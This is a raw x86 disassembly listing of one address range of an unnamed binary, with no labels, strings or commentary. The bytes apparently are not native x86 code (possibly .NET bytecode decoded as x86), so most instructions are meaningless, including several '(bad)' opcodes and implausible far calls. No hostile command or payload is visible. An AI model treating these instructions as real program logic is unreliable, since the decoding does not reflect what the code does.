  402cb1:	add    BYTE PTR [eax],al
  402cb3:	adc    DWORD PTR [eax],ebp
  402cb5:	xor    DWORD PTR [eax],eax
  402cb7:	add    BYTE PTR [edx],cl
  402cb9:	jb     0x402ceb
  402cbb:	add    al,0x0
  402cbd:	jo     0x402cd6
  402cbf:	lea    eax,[ecx]
  402cc1:	add    BYTE PTR [eax],al
  402cc3:	add    DWORD PTR [edx],ecx
  402cc5:	push   es
  402cc6:	push   ss
  402cc7:	add    esp,DWORD PTR [edx+0x322806]
  402ccd:	add    BYTE PTR [edx],cl
  402ccf:	sub    dl,BYTE PTR [ebx]
  402cd1:	xor    BYTE PTR ds:0x2100,al
  402cd7:	add    BYTE PTR [esi],cl
  402cd9:	add    BYTE PTR [eax],al
  402cdb:	adc    DWORD PTR [eax],ebp
  402cdd:	xor    DWORD PTR [eax],eax
  402cdf:	add    BYTE PTR [edx],cl
  402ce1:	jb     0x402d2b
  402ce3:	add    al,0x0
  402ce5:	jo     0x402cfe
  402ce7:	lea    eax,[ecx]
  402ce9:	add    BYTE PTR [eax],al
  402ceb:	add    DWORD PTR [edx],ecx
  402ced:	push   es
  402cee:	push   ss
  402cef:	add    ebp,DWORD PTR [edi+0x1e]
  402cf2:	add    BYTE PTR [eax],al
  402cf4:	or     ah,BYTE PTR [edx+0x322806]
  402cfa:	add    BYTE PTR [edx],cl
  402cfc:	sub    al,BYTE PTR [eax]
  402cfe:	add    BYTE PTR [eax],al
  402d00:	sbb    esi,DWORD PTR [eax]
  402d02:	add    al,0x0
  402d04:	jle    0x402d06
  402d06:	add    BYTE PTR [eax],al
  402d08:	sldt   WORD PTR [eax]
  402d0b:	adc    DWORD PTR [ebx+0x73],esi
  402d0e:	add    BYTE PTR [eax],al
  402d10:	or     cl,BYTE PTR [edx]
  402d12:	add    al,0x6f
  402d14:	and    eax,0x160a0000
  402d19:	xor    DWORD PTR [esp+eax*1+0x6f],ebx
  402d1d:	add    BYTE PTR es:[eax],al
  402d20:	or     dl,BYTE PTR [ebx]
  402d22:	add    al,0x2b
  402d24:	cmp    DWORD PTR [edx],edx
  402d26:	add    al,0x28
  402d28:	daa    
  402d29:	add    BYTE PTR [eax],al
  402d2b:	or     cl,BYTE PTR [ebx]
  402d2d:	add    eax,DWORD PTR [edi]
  402d2f:	sbb    BYTE PTR [eax],ah
  402d31:	adc    al,0x1
  402d33:	add    BYTE PTR [eax],al
  402d35:	outs   dx,DWORD PTR ds:[esi]
  402d36:	sub    BYTE PTR [eax],al
  402d38:	add    BYTE PTR [edx],cl
  402d3a:	or     al,0x8
  402d3c:	sub    al,0x20
  402d3e:	or     BYTE PTR [esi+0x1a311669],cl
  402d44:	or     BYTE PTR [edx],al
  402d46:	inc    BYTE PTR [esi]
  402d48:	adc    eax,0x73060000
  402d4d:	je     0x402d4f
  402d4f:	add    BYTE PTR [edx],cl
  402d51:	sub    BYTE PTR [edx],al
  402d53:	add    BYTE PTR [eax],al
  402d55:	sub    ecx,DWORD PTR ds:0x756f0906
  402d5b:	add    BYTE PTR [eax],al
  402d5d:	or     dl,BYTE PTR [edx]
  402d5f:	add    al,0x28
  402d61:	sub    al,0x0
  402d63:	add    BYTE PTR [edx],cl
  402d65:	sub    eax,0x121fdebe
  402d6a:	add    al,0xfe
  402d6c:	push   ss
  402d6d:	push   es
  402d6e:	add    BYTE PTR [eax],al
  402d70:	sbb    ebp,DWORD PTR [edi+0x20]
  402d73:	add    BYTE PTR [eax],al
  402d75:	or     bl,ah
  402d77:	push   es
  402d78:	add    esp,DWORD PTR [eax]
  402d7a:	adc    al,0x1
  402d7c:	add    BYTE PTR [eax],al
  402d7e:	outs   dx,DWORD PTR ds:[esi]
  402d7f:	jbe    0x402d81
  402d81:	add    BYTE PTR [edx],cl
  402d83:	outs   dx,DWORD PTR ds:[esi]
  402d84:	jne    0x402d86
  402d86:	add    BYTE PTR [edx],cl
  402d88:	push   es
  402d89:	sub    al,BYTE PTR [eax]
  402d8b:	add    BYTE PTR [ecx],al
  402d8d:	adc    BYTE PTR [eax],al
  402d8f:	add    BYTE PTR [edx],al
  402d91:	add    BYTE PTR [edi],dl
  402d93:	add    BYTE PTR [esi+0x5d],al
  402d96:	add    BYTE PTR [esi],cl
  402d98:	add    BYTE PTR [eax],al
  402d9a:	add    BYTE PTR [eax],al
  402d9c:	adc    esi,DWORD PTR [eax]
  402d9e:	add    eax,0x5900
  402da3:	add    BYTE PTR [eax],dl
  402da5:	add    BYTE PTR [eax],al
  402da7:	adc    DWORD PTR [ebx],eax
  402da9:	jne    0x402dbc
  402dab:	add    BYTE PTR [eax],al
  402dad:	add    DWORD PTR [edx],ecx
  402daf:	push   es
  402db0:	adc    al,0x28
  402db2:	ja     0x402db4
  402db4:	add    BYTE PTR [edx],cl
  402db6:	sub    al,0x47
  402db8:	add    dh,BYTE PTR [edx+0x60]
  402dbb:	add    al,0x0
  402dbd:	jo     0x402dd6
  402dbf:	lea    eax,[ecx]
  402dc1:	add    BYTE PTR [eax],al
  402dc3:	add    DWORD PTR [ebx],ecx
  402dc5:	pop    es
  402dc6:	push   ss
  402dc7:	add    ebp,DWORD PTR [edi+0x1e]
  402dca:	add    BYTE PTR [eax],al
  402dcc:	or     ah,BYTE PTR [edx+0x232807]
  402dd2:	add    BYTE PTR [esi],al
  402dd4:	sub    BYTE PTR [ecx],dh
  402dd6:	add    BYTE PTR [eax],al
  402dd8:	or     dh,BYTE PTR [edx-0xf]
  402ddb:	add    al,0x0
  402ddd:	jo     0x402df6
  402ddf:	lea    eax,[ecx]
  402de1:	add    BYTE PTR [eax],al
  402de3:	add    DWORD PTR [eax+ecx*1],ecx
  402de6:	push   ss
  402de7:	add    ebp,DWORD PTR [edi+0x1e]
  402dea:	add    BYTE PTR [eax],al
  402dec:	or     ah,BYTE PTR [edx+0x322808]
  402df2:	add    BYTE PTR [edx],cl
  402df4:	jb     0x402e08
  402df6:	add    al,BYTE PTR [eax]
  402df8:	jo     0x402e6d
  402dfa:	xor    eax,DWORD PTR [eax]
  402dfc:	add    BYTE PTR [edx],cl
  402dfe:	jp     0x402e06
  402e00:	sub    al,BYTE PTR [eax]
  402e02:	add    BYTE PTR [eax],al
  402e04:	adc    esi,DWORD PTR [eax]
  402e06:	add    al,BYTE PTR [eax]
  402e08:	adc    eax,0x11000000
  402e0d:	add    BYTE PTR [eax],al
  402e0f:	adc    DWORD PTR [ebx],eax
  402e11:	outs   dx,DWORD PTR ds:[esi]
  402e12:	sub    al,0x0
  402e14:	add    BYTE PTR [esi],al
  402e16:	jae    0x402e90
  402e18:	add    BYTE PTR [eax],al
  402e1a:	or     cl,BYTE PTR [edx]
  402e1c:	add    al,BYTE PTR [esi]
  402e1e:	sub    BYTE PTR ds:0x6060000,al
  402e24:	sub    al,BYTE PTR [eax]
  402e26:	add    BYTE PTR [eax],al
  402e28:	adc    esi,DWORD PTR [eax]
  402e2a:	push   es
  402e2b:	add    BYTE PTR [edi],al
  402e2d:	add    DWORD PTR [eax],eax
  402e2f:	add    BYTE PTR [edx],dl
  402e31:	add    BYTE PTR [eax],al
  402e33:	adc    DWORD PTR [ebx],eax
  402e35:	outs   dx,DWORD PTR ds:[esi]
  402e36:	jns    0x402e38
  402e38:	add    BYTE PTR [edx],cl
  402e3a:	outs   dx,DWORD PTR ds:[esi]
  402e3b:	jp     0x402e3d
  402e3d:	add    BYTE PTR [edx],cl
  402e3f:	sub    al,0x1c
  402e41:	add    ebp,DWORD PTR [edi+0x79]
  402e44:	add    BYTE PTR [eax],al
  402e46:	or     ch,BYTE PTR [edi+0x7b]
  402e49:	add    BYTE PTR [eax],al
  402e4b:	or     dl,al
  402e4d:	add    BYTE PTR gs:[eax],al
  402e50:	add    DWORD PTR [eax],ebp
  402e52:	xor    eax,0x280a0000
  402e57:	push   esp
  402e58:	add    BYTE PTR [eax],al
  402e5a:	or     ch,BYTE PTR [esi+edi*1]
  402e5d:	add    dh,BYTE PTR [edx+0x45]
  402e60:	add    eax,0x8d197000
  402e65:	add    DWORD PTR [eax],eax
  402e67:	add    BYTE PTR [ecx],al
  402e69:	or     eax,DWORD PTR [edi]
  402e6b:	push   ss
  402e6c:	add    ebp,DWORD PTR [edi+0x68]
  402e6f:	add    BYTE PTR [eax],al
  402e71:	or     ch,BYTE PTR [edi+0x17]
  402e74:	add    BYTE PTR [eax],al
  402e76:	or     ah,BYTE PTR [edx+0x6f031707]
  402e7c:	push   ds
  402e7d:	add    BYTE PTR [eax],al
  402e7f:	or     ah,BYTE PTR [edx+0x65d01807]
  402e85:	add    BYTE PTR [eax],al
  402e87:	add    DWORD PTR [eax],ebp
  402e89:	xor    eax,0x6f0a0000
  402e8e:	pop    ss
  402e8f:	add    BYTE PTR [eax],al
  402e91:	or     ah,BYTE PTR [edx+0x232807]
  402e97:	add    BYTE PTR [esi],al
  402e99:	push   ss
  402e9a:	sub    al,BYTE PTR [ebx]
  402e9c:	outs   dx,DWORD PTR ds:[esi]
  402e9d:	jns    0x402e9f
  402e9f:	add    BYTE PTR [edx],cl
  402ea1:	outs   dx,DWORD PTR ds:[esi]
  402ea2:	jl     0x402ea4
  402ea4:	add    BYTE PTR [edx],cl
  402ea6:	or     al,BYTE PTR [esi]
  402ea8:	sub    al,0x6
  402eaa:	push   es
  402eab:	mov    gs,WORD PTR [ecx+0x17]
  402eae:	cs sub al,0x2
  402eb1:	jb     0x402f2e
  402eb3:	add    eax,0x8d187000
  402eb8:	add    DWORD PTR [eax],eax
  402eba:	add    BYTE PTR [ecx],al
  402ebc:	or     al,0x8
  402ebe:	push   ss
  402ebf:	add    ebp,DWORD PTR [edi+0x68]
  402ec2:	add    BYTE PTR [eax],al
  402ec4:	or     ch,BYTE PTR [edi+0x17]
  402ec7:	add    BYTE PTR [eax],al
  402ec9:	or     ah,BYTE PTR [edx+0x6f031708]
  402ecf:	push   ds
  402ed0:	add    BYTE PTR [eax],al
  402ed2:	or     ah,BYTE PTR [edx+0x232808]
  402ed8:	add    BYTE PTR [esi],al
  402eda:	push   ss
  402edb:	sub    dl,al
  402edd:	data16 add BYTE PTR [eax],al
  402ee0:	add    DWORD PTR [eax],ebp
  402ee2:	xor    eax,0x60a0000
  402ee7:	push   ss
  402ee8:	call   0x2d0a:0x7d6f
  402eef:	dec    ecx
  402ef0:	add    dh,BYTE PTR [edx-0x21]
  402ef3:	add    eax,0x8d1a7000
  402ef8:	add    DWORD PTR [eax],eax
  402efa:	add    BYTE PTR [ecx],al
  402efc:	or     eax,0x6f031609
  402f01:	push   0x6f0a0000
  402f06:	pop    ss
  402f07:	add    BYTE PTR [eax],al
  402f09:	or     ah,BYTE PTR [edx+0x6f031709]
  402f0f:	push   ds
  402f10:	add    BYTE PTR [eax],al
  402f12:	or     ah,BYTE PTR [edx+0x16061809]
  402f18:	call   0xa20a:0x176f
  402f1f:	or     DWORD PTR [ecx],ebx
  402f21:	shl    BYTE PTR [esi+0x0],1
  402f24:	add    BYTE PTR [ecx],al
  402f26:	sub    BYTE PTR ds:0x6f0a0000,dh
  402f2c:	pop    ss
  402f2d:	add    BYTE PTR [eax],al
  402f2f:	or     ah,BYTE PTR [edx+0x232809]
  402f35:	add    BYTE PTR [esi],al
  402f37:	push   ss
  402f38:	sub    dl,BYTE PTR [edi]
  402f3a:	sub    al,BYTE PTR [eax]
  402f3c:	sbb    esi,DWORD PTR [eax]
  402f3e:	push   es
  402f3f:	add    BYTE PTR [edi+0x13000002],bh
  402f45:	add    BYTE PTR [eax],al
  402f47:	adc    DWORD PTR [ebx+0x3d],esi
  402f4a:	add    BYTE PTR [eax],al
  402f4c:	or     cl,BYTE PTR [edx]
  402f4e:	push   es
  402f4f:	add    al,0x6f
  402f51:	push   ds
  402f52:	add    BYTE PTR [eax],al
  402f54:	or     ch,BYTE PTR [edi+0x3e]
  402f57:	add    BYTE PTR [eax],al
  402f59:	or     al,BYTE PTR [esi]
  402f5b:	pop    ss
  402f5c:	outs   dx,DWORD PTR ds:[esi]
  402f5d:	aas    
  402f5e:	add    BYTE PTR [eax],al
  402f60:	or     al,BYTE PTR [esi]
  402f62:	pop    ss
  402f63:	outs   dx,DWORD PTR ds:[esi]
  402f64:	inc    eax
  402f65:	add    BYTE PTR [eax],al
  402f67:	or     al,BYTE PTR [esi]
  402f69:	outs   dx,DWORD PTR ds:[esi]
  402f6a:	inc    ecx
  402f6b:	add    BYTE PTR [eax],al
  402f6d:	or     dl,al
  402f6f:	add    BYTE PTR [bx+si],al
  402f72:	add    DWORD PTR [eax],ebp
  402f74:	xor    eax,0x6f0a0000
  402f79:	push   ds
  402f7a:	add    BYTE PTR [eax],al
  402f7c:	or     ch,BYTE PTR [edi+0x42]
  402f7f:	add    BYTE PTR [eax],al
  402f81:	or     al,BYTE PTR [edx]
  402f83:	push   es
  402f84:	sub    BYTE PTR [eax],ah
  402f86:	add    BYTE PTR [eax],al
  402f88:	push   es
  402f89:	add    al,BYTE PTR [esi]
  402f8b:	add    al,0x28
  402f8d:	push   es
  402f8e:	add    BYTE PTR [eax],al
  402f90:	push   es
  402f91:	add    ch,BYTE PTR [eax]
  402f93:	sbb    DWORD PTR [eax],eax
  402f95:	add    BYTE PTR [esi],al
  402f97:	or     edx,DWORD PTR [esi]
  402f99:	or     al,0xe
  402f9b:	add    al,0x2c
  402f9d:	bound  eax,QWORD PTR [esi]
  402f9f:	outs   dx,DWORD PTR ds:[esi]
  402fa0:	cmp    eax,DWORD PTR [eax]
  402fa2:	add    BYTE PTR [edx],cl
  402fa4:	add    dh,BYTE PTR [edx+0x57]
  402fa7:	push   es
  402fa8:	add    BYTE PTR [eax-0x30],dh
  402fab:	add    DWORD PTR [eax],eax
  402fad:	add    BYTE PTR [ecx],al
  402faf:	sub    BYTE PTR ds:0x60a0000,dh
  402fb5:	outs   dx,DWORD PTR ds:[esi]
  402fb6:	dec    eax
  402fb7:	add    BYTE PTR [eax],al
  402fb9:	or     ch,BYTE PTR [eax]
  402fbb:	adc    BYTE PTR [eax],al
  402fbd:	add    BYTE PTR [esi],al
  402fbf:	outs   dx,DWORD PTR ds:[esi]
  402fc0:	cmp    al,0x0
  402fc2:	add    BYTE PTR [edx],cl
  402fc4:	es push es
  402fc6:	outs   dx,DWORD PTR ds:[esi]
  402fc7:	cmp    eax,DWORD PTR [eax]
  402fc9:	add    BYTE PTR [edx],cl
  402fcb:	add    dh,BYTE PTR [edx+0x57]
  402fce:	push   es
  402fcf:	add    BYTE PTR [eax-0x30],dh
  402fd2:	add    DWORD PTR [eax],eax
  402fd4:	add    BYTE PTR [ecx],al
  402fd6:	sub    BYTE PTR ds:0x60a0000,dh
  402fdc:	outs   dx,DWORD PTR ds:[esi]
  402fdd:	dec    eax
  402fde:	add    BYTE PTR [eax],al
  402fe0:	or     ch,BYTE PTR [eax]
  402fe2:	adc    DWORD PTR [eax],eax
  402fe4:	add    BYTE PTR [esi],al
  402fe6:	outs   dx,DWORD PTR ds:[esi]
  402fe7:	cmp    al,0x0
  402fe9:	add    BYTE PTR [edx],cl
  402feb:	es pop es
  402fed:	outs   dx,DWORD PTR ds:[esi]
  402fee:	dec    ecx
  402fef:	add    BYTE PTR [eax],al
  402ff1:	or     al,BYTE PTR [edx]
  402ff3:	sub    BYTE PTR [edx],bl
  402ff5:	add    BYTE PTR [eax],al
  402ff7:	push   es
  402ff8:	outs   dx,DWORD PTR ds:[esi]
  402ff9:	dec    edx
  402ffa:	add    BYTE PTR [eax],al
  402ffc:	or     ah,BYTE PTR [esi]
  402ffe:	pop    ss
  402fff:	or     al,0x4
  403001:	outs   dx,DWORD PTR ds:[esi]
  403002:	jns    0x403004
  403004:	add    BYTE PTR [edx],cl
  403006:	outs   dx,DWORD PTR ds:[esi]
  403007:	jl     0x403009
  403009:	add    BYTE PTR [edx],cl
  40300b:	push   ss
  40300c:	call   0x6f06:0x562c050d
  403013:	cmp    eax,DWORD PTR [eax]
  403015:	add    BYTE PTR [edx],cl
  403017:	add    dh,BYTE PTR [edx+0x65]
  40301a:	push   es
  40301b:	add    BYTE PTR [eax+0x9],dh
  40301e:	push   es
  40301f:	outs   dx,DWORD PTR ds:[esi]
  403020:	dec    eax
  403021:	add    BYTE PTR [eax],al
  403023:	or     ch,BYTE PTR [eax]
  403025:	adc    BYTE PTR [eax],al
  403027:	add    BYTE PTR [esi],al
  403029:	outs   dx,DWORD PTR ds:[esi]
  40302a:	cmp    al,0x0
  40302c:	add    BYTE PTR [edx],cl
  40302e:	es push es
  403030:	outs   dx,DWORD PTR ds:[esi]
  403031:	cmp    eax,DWORD PTR [eax]
  403033:	add    BYTE PTR [edx],cl
  403035:	add    dh,BYTE PTR [edx+0x65]
  403038:	push   es
  403039:	add    BYTE PTR [eax+0x9],dh
  40303c:	push   es
  40303d:	outs   dx,DWORD PTR ds:[esi]
  40303e:	dec    eax
  40303f:	add    BYTE PTR [eax],al
  403041:	or     ch,BYTE PTR [eax]
  403043:	adc    DWORD PTR [eax],eax
  403045:	add    BYTE PTR [esi],al
  403047:	outs   dx,DWORD PTR ds:[esi]
  403048:	cmp    al,0x0
  40304a:	add    BYTE PTR [edx],cl
  40304c:	es pop es
  40304e:	outs   dx,DWORD PTR ds:[esi]
  40304f:	dec    ecx
  403050:	add    BYTE PTR [eax],al
  403052:	or     al,BYTE PTR [edx]
  403054:	or     DWORD PTR [eax],ebp
  403056:	sbb    eax,DWORD PTR [eax]
  403058:	add    BYTE PTR [esi],al
  40305a:	outs   dx,DWORD PTR ds:[esi]
  40305b:	dec    edx
  40305c:	add    BYTE PTR [eax],al
  40305e:	or     ah,BYTE PTR [esi]
  403060:	pop    ss
  403061:	or     al,0x38
  403063:	add    BYTE PTR [ecx],0x0
  403066:	add    BYTE PTR [esi],dl
  403068:	adc    eax,DWORD PTR [edx+eax*1]
  40306b:	or     DWORD PTR [eax],ebp
  40306d:	push   ds
  40306e:	add    BYTE PTR [eax],al
  403070:	push   es
  403071:	outs   dx,DWORD PTR ds:[esi]
  403072:	jle    0x403074
  403074:	add    BYTE PTR [edx],cl
  403076:	adc    ecx,DWORD PTR [ecx]
  403078:	sub    edi,DWORD PTR [edi+0x11]
  40307b:	or     DWORD PTR [edi+0x7f],ebp
  40307e:	add    BYTE PTR [eax],al
  403080:	or     dl,BYTE PTR [ebx]
  403082:	add    eax,0x6f051102
  403087:	push   ds
  403088:	add    BYTE PTR [eax],al
  40308a:	or     ch,BYTE PTR [eax]
  40308c:	sldt   WORD PTR [eax]
  40308f:	push   es
  403090:	adc    eax,DWORD PTR [esi]
  403092:	push   es
  403093:	outs   dx,DWORD PTR ds:[esi]
  403094:	cmp    eax,DWORD PTR [eax]
  403096:	add    BYTE PTR [edx],cl
  403098:	add    dl,BYTE PTR [ecx]
  40309a:	push   es
  40309b:	adc    DWORD PTR ds:0x806f,eax
  4030a1:	or     al,BYTE PTR [esi]
  4030a3:	outs   dx,DWORD PTR ds:[esi]
  4030a4:	dec    eax
  4030a5:	add    BYTE PTR [eax],al
  4030a7:	or     ch,BYTE PTR [eax]
  4030a9:	adc    BYTE PTR [eax],al
  4030ab:	add    BYTE PTR [esi],al
  4030ad:	outs   dx,DWORD PTR ds:[esi]
  4030ae:	cmp    al,0x0
  4030b0:	add    BYTE PTR [edx],cl
  4030b2:	es push es
  4030b4:	outs   dx,DWORD PTR ds:[esi]
  4030b5:	cmp    eax,DWORD PTR [eax]
  4030b7:	add    BYTE PTR [edx],cl
  4030b9:	add    dl,BYTE PTR [ecx]
  4030bb:	push   es
  4030bc:	adc    DWORD PTR ds:0x806f,eax
  4030c2:	or     al,BYTE PTR [esi]
  4030c4:	outs   dx,DWORD PTR ds:[esi]
  4030c5:	dec    eax
  4030c6:	add    BYTE PTR [eax],al
  4030c8:	or     ch,BYTE PTR [eax]
  4030ca:	adc    DWORD PTR [eax],eax
  4030cc:	add    BYTE PTR [esi],al
  4030ce:	outs   dx,DWORD PTR ds:[esi]
  4030cf:	cmp    al,0x0
  4030d1:	add    BYTE PTR [edx],cl
  4030d3:	es pop es
  4030d5:	outs   dx,DWORD PTR ds:[esi]
  4030d6:	dec    ecx
  4030d7:	add    BYTE PTR [eax],al
  4030d9:	or     al,BYTE PTR [edx]
  4030db:	adc    DWORD PTR [esi],eax
  4030dd:	adc    DWORD PTR ds:0x1e6f,eax
  4030e3:	or     dl,BYTE PTR [ecx]
  4030e5:	add    eax,0x806f
  4030ea:	or     ch,BYTE PTR [eax]
  4030ec:	sbb    al,0x0
  4030ee:	add    BYTE PTR [esi],al
  4030f0:	outs   dx,DWORD PTR ds:[esi]
  4030f1:	dec    edx
  4030f2:	add    BYTE PTR [eax],al
  4030f4:	or     ah,BYTE PTR [esi]
  4030f6:	pop    ss
  4030f7:	adc    eax,DWORD PTR [ecx+edx*1]
  4030fa:	or     DWORD PTR [edi-0x7f],ebp
  4030fd:	add    BYTE PTR [eax],al
  4030ff:	or     bh,BYTE PTR [edx]
  403101:	jne    0x403102
  403103:	(bad)  
  403104:	(bad)  
  403105:	fimul  WORD PTR [ecx+edx*1]
  403108:	or     DWORD PTR [edi+eax*1],ebp
  40310b:	adc    DWORD PTR [ecx],ecx
  40310d:	outs   dx,DWORD PTR ds:[esi]
  40310e:	and    BYTE PTR [eax],al
  403110:	add    BYTE PTR [edx],cl
  403112:	fadd   QWORD PTR [edx]
  403114:	or     DWORD PTR [eax],ebp
  403116:	pop    ds
  403117:	add    BYTE PTR [eax],al
  403119:	push   es
  40311a:	outs   dx,DWORD PTR ds:[esi]
  40311b:	add    BYTE PTR [eax],0x0
  40311e:	or     dl,BYTE PTR [ebx]
  403120:	or     ch,BYTE PTR [ebx]
  403122:	jg     0x403135
  403124:	or     ch,BYTE PTR [edi-0x7d]
  403127:	add    BYTE PTR [eax],al
  403129:	or     dl,BYTE PTR [ebx]
  40312b:	pop    es
  40312c:	add    dl,BYTE PTR [ecx]
  40312e:	pop    es
  40312f:	outs   dx,DWORD PTR ds:[esi]
  403130:	push   ds
  403131:	add    BYTE PTR [eax],al
  403133:	or     ch,BYTE PTR [eax]
  403135:	sldt   WORD PTR [eax]
  403138:	push   es
  403139:	adc    ecx,DWORD PTR [eax]
  40313b:	push   es
  40313c:	outs   dx,DWORD PTR ds:[esi]
  40313d:	cmp    eax,DWORD PTR [eax]
  40313f:	add    BYTE PTR [edx],cl
  403141:	add    dl,BYTE PTR [ecx]
  403143:	or     BYTE PTR [ecx],dl
  403145:	pop    es
  403146:	outs   dx,DWORD PTR ds:[esi]
  403147:	test   BYTE PTR [eax],al
  403149:	add    BYTE PTR [edx],cl
  40314b:	push   es
  40314c:	outs   dx,DWORD PTR ds:[esi]
  40314d:	dec    eax
  40314e:	add    BYTE PTR [eax],al
  403150:	or     ch,BYTE PTR [eax]
  403152:	adc    BYTE PTR [eax],al
  403154:	add    BYTE PTR [esi],al
  403156:	outs   dx,DWORD PTR ds:[esi]
  403157:	cmp    al,0x0
  403159:	add    BYTE PTR [edx],cl
  40315b:	es push es
  40315d:	outs   dx,DWORD PTR ds:[esi]
  40315e:	cmp    eax,DWORD PTR [eax]
  403160:	add    BYTE PTR [edx],cl
  403162:	add    dl,BYTE PTR [ecx]
  403164:	or     BYTE PTR [ecx],dl
  403166:	pop    es
  403167:	outs   dx,DWORD PTR ds:[esi]
  403168:	test   BYTE PTR [eax],al
  40316a:	add    BYTE PTR [edx],cl
  40316c:	push   es
  40316d:	outs   dx,DWORD PTR ds:[esi]
  40316e:	dec    eax
  40316f:	add    BYTE PTR [eax],al
  403171:	or     ch,BYTE PTR [eax]
  403173:	adc    DWORD PTR [eax],eax
  403175:	add    BYTE PTR [esi],al
  403177:	outs   dx,DWORD PTR ds:[esi]
  403178:	cmp    al,0x0
  40317a:	add    BYTE PTR [edx],cl
  40317c:	es pop es
  40317e:	outs   dx,DWORD PTR ds:[esi]
  40317f:	dec    ecx
  403180:	add    BYTE PTR [eax],al
  403182:	or     al,BYTE PTR [edx]
  403184:	adc    DWORD PTR [eax],ecx
  403186:	adc    DWORD PTR [edi],eax
  403188:	outs   dx,DWORD PTR ds:[esi]
  403189:	push   ds
  40318a:	add    BYTE PTR [eax],al
  40318c:	or     dl,BYTE PTR [ecx]
  40318e:	pop    es
  40318f:	outs   dx,DWORD PTR ds:[esi]
  403190:	test   BYTE PTR [eax],al
  403192:	add    BYTE PTR [edx],cl
  403194:	sub    BYTE PTR [eax+eax*1],bl
  403197:	add    BYTE PTR [esi],al
  403199:	outs   dx,DWORD PTR ds:[esi]
  40319a:	dec    edx
  40319b:	add    BYTE PTR [eax],al
  40319d:	or     ah,BYTE PTR [esi]
  40319f:	pop    ss
  4031a0:	adc    eax,DWORD PTR [ecx+edx*1]
  4031a3:	or     ch,BYTE PTR [edi-0x7f]
  4031a6:	add    BYTE PTR [eax],al
  4031a8:	or     bh,BYTE PTR [edx]
  4031aa:	jne    0x4031ab
  4031ac:	(bad)  
  4031ad:	(bad)  
  4031ae:	fimul  WORD PTR [ecx+edx*1]
  4031b1:	or     ch,BYTE PTR [edi+eax*1]
  4031b4:	adc    DWORD PTR [edx],ecx
  4031b6:	outs   dx,DWORD PTR ds:[esi]
  4031b7:	and    BYTE PTR [eax],al
  4031b9:	add    BYTE PTR [edx],cl
  4031bb:	fcom   QWORD PTR [ecx]
  4031bd:	add    al,0x2c
  4031bf:	sub    DWORD PTR [edi],edx
  4031c1:	or     al,0x7
  4031c3:	outs   dx,DWORD PTR ds:[esi]
  4031c4:	dec    ecx
  4031c5:	add    BYTE PTR [eax],al
  4031c7:	or     dl,BYTE PTR [esi]
  4031c9:	or     DWORD PTR [edx+0x69],esi
  4031cc:	push   es
  4031cd:	add    BYTE PTR [eax+0x9],dh
  4031d0:	jb     0x403178
  4031d2:	add    al,BYTE PTR [eax]
  4031d4:	jo     0x403249
  4031d6:	test   DWORD PTR [eax],eax
  4031d8:	add    BYTE PTR [edx],cl
  4031da:	jae    0x40322b
  4031dc:	add    BYTE PTR [eax],al
  4031de:	or     dh,BYTE PTR [ebx-0x7a]
  4031e1:	add    BYTE PTR [eax],al
  4031e3:	or     ch,BYTE PTR [edi-0x79]
  4031e6:	add    BYTE PTR [eax],al
  4031e8:	or     cl,BYTE PTR [eax]
  4031ea:	sub    al,0xd
  4031ec:	push   es
  4031ed:	outs   dx,DWORD PTR ds:[esi]
  4031ee:	cmp    eax,DWORD PTR [eax]
  4031f0:	add    BYTE PTR [edx],cl
  4031f2:	pop    es
  4031f3:	outs   dx,DWORD PTR ds:[esi]
  4031f4:	cmp    al,0x0
  4031f6:	add    BYTE PTR [edx],cl
  4031f8:	add    ebp,DWORD PTR es:[edi+0x51]
  4031fc:	add    BYTE PTR [eax],al
  4031fe:	or     al,BYTE PTR [esi]
  403200:	outs   dx,DWORD PTR ds:[esi]
  403201:	push   edx
  403202:	add    BYTE PTR [eax],al
  403204:	or     ah,BYTE PTR [esi]
  403206:	sub    al,BYTE PTR [eax]
  403208:	add    DWORD PTR [eax+eax*1],ebx
  40320b:	add    BYTE PTR [edx],al
  40320d:	add    BYTE PTR [eax],dh
  40320f:	add    DWORD PTR [edi+0xc01bf],ecx
  403215:	add    BYTE PTR [eax],al
  403217:	add    BYTE PTR [edx],al
  403219:	add    cl,bl
  40321b:	add    DWORD PTR [edi+0xc0268],ecx
  403221:	add    BYTE PTR [eax],al
  403223:	add    BYTE PTR [ebx],dl
  403225:	xor    BYTE PTR [ebx],al
  403227:	add    BYTE PTR [esi],bh
  403229:	add    BYTE PTR [eax],al
  40322b:	add    BYTE PTR [eax],cl
  40322d:	add    BYTE PTR [eax],al
  40322f:	adc    DWORD PTR [ebx+0x55],esi
  403232:	add    BYTE PTR [eax],al
  403234:	or     cl,BYTE PTR [edx]
  403236:	push   es
  403237:	jb     0x4032b2
  403239:	push   es
  40323a:	add    BYTE PTR [eax+0x6f],dh
  40323d:	add    BYTE PTR ds:[eax],al
  403240:	or     al,BYTE PTR [esi]
  403242:	and    BYTE PTR [eax+esi*1],al
  403245:	add    BYTE PTR [eax],al
  403247:	outs   dx,DWORD PTR ds:[esi]
  403248:	cmp    al,BYTE PTR [eax]
  40324a:	add    BYTE PTR [edx],cl
  40324c:	push   es
  40324d:	outs   dx,DWORD PTR ds:[esi]
  40324e:	push   esi
  40324f:	add    BYTE PTR [eax],al
  403251:	or     dl,al
  403253:	push   ecx
  403254:	add    BYTE PTR [eax],al
  403256:	add    DWORD PTR [eax],ebp
  403258:	xor    eax,0x720a0000
  40325d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40325e:	add    al,BYTE PTR [eax]
  403260:	jo     0x4032d5
  403262:	push   edi
  403263:	add    BYTE PTR [eax],al
  403265:	or     ch,BYTE PTR [edi+0x58]
  403268:	add    BYTE PTR [eax],al
  40326a:	or     ah,BYTE PTR [esi]
  40326c:	push   es
  40326d:	sub    al,BYTE PTR [eax]
  40326f:	add    BYTE PTR [ebx],dl
  403271:	xor    BYTE PTR [ebx],al
  403273:	add    BYTE PTR [edx],ah
  403275:	add    BYTE PTR [eax],al
  403277:	add    BYTE PTR [edx],cl
  403279:	add    BYTE PTR [eax],al
  40327b:	adc    DWORD PTR [ebx+0x4b],esi
  40327e:	add    BYTE PTR [eax],al
  403280:	or     dh,BYTE PTR [edx+0x57]
  403283:	push   es
  403284:	add    BYTE PTR [eax+0x73],dh
  403287:	dec    esp
  403288:	add    BYTE PTR [eax],al
  40328a:	or     al,BYTE PTR [edx]
  40328c:	jb     0x40321b
  40328e:	push   es
  40328f:	add    BYTE PTR [eax+0x28],dh
  403292:	sbb    eax,0x73060000
  403297:	push   eax
  403298:	add    BYTE PTR [eax],al
  40329a:	or     cl,BYTE PTR [edx]
  40329c:	push   es
  40329d:	sub    al,BYTE PTR [eax]
